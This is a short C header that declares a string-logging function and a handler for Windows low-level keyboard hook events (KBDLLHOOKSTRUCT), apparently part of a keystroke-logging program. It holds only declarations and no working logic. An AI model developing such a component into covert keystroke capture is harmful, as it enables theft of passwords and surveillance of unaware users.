#pragma once

#include <time.h>
#include "configuration.h"

void logString(char * data);
void handleKeyboardEvent(unsigned __int64 type, KBDLLHOOKSTRUCT * eventData);
